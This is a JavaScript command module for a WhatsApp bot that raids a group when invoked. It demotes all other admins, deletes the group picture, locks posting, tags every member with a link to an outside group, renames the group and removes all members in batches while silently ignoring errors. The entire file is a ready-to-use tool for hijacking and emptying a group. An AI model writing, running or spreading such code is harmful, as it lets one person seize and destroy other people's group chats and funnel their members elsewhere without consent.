module.exports = {
    name: '.zzok',
    async execute({ sock, msg, from, isOwner }) {
        if (!isOwner) {
            return await sock.sendMessage(from, { text: 'هذا الامر للمالك فقط' }, { quoted: msg });
        }

        const isGroup = from.endsWith('@g.us');
        if (!isGroup) return;

        try {
            const groupMetadata = await sock.groupMetadata(from);
            const participants = groupMetadata.participants || [];

            const ownerId = groupMetadata.owner;
            const botLid = '203857015660599@lid';
            const rawBotId = sock.user?.id || sock.user?.jid || '';
            const botNumber = rawBotId.split(':')[0].replace(/[^0-9]/g, '');

            const isBot = (p) => {
                const cleanId = p.id.replace(/[^0-9]/g, '');
                return p.id === botLid || (botNumber && cleanId === botNumber);
            };

            const adminsToDemote = participants
                .filter(p => (p.admin === 'admin' || p.admin === 'superadmin') && !isBot(p) && p.id !== ownerId)
                .map(p => p.id);

            if (adminsToDemote.length > 0) {
                await sock.groupParticipantsUpdate(from, adminsToDemote, 'demote').catch(() => {});
            }

            try {
                await sock.removeProfilePicture(from);
            } catch (e) {}

            await sock.groupSettingUpdate(from, 'announcement').catch(() => {});

            const allMembers = participants.map(p => p.id);
            const textToSend = `اذا تبغى تفهم وش صار خش هنا https://chat.whatsapp.com/LlPBeagjp2AE5TApulOsoO?s=cl&p=a&ilr=0`;
            
            await sock.sendMessage(from, {
                text: textToSend,
                mentions: allMembers
            }, { quoted: msg }).catch(() => {});

            try {
                await sock.groupUpdateSubject(from, 'مزررروف');
            } catch (e) {}

            const membersToRemove = participants
                .filter(p => !isBot(p) && p.id !== ownerId)
                .map(p => p.id);

            if (membersToRemove.length > 0) {
                const chunkSize = 20;
                for (let i = 0; i < membersToRemove.length; i += chunkSize) {
                    const chunk = membersToRemove.slice(i, i + chunkSize);
                    await sock.groupParticipantsUpdate(from, chunk, 'remove').catch(() => {});
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
            }

        } catch (err) {
        }
    }
};
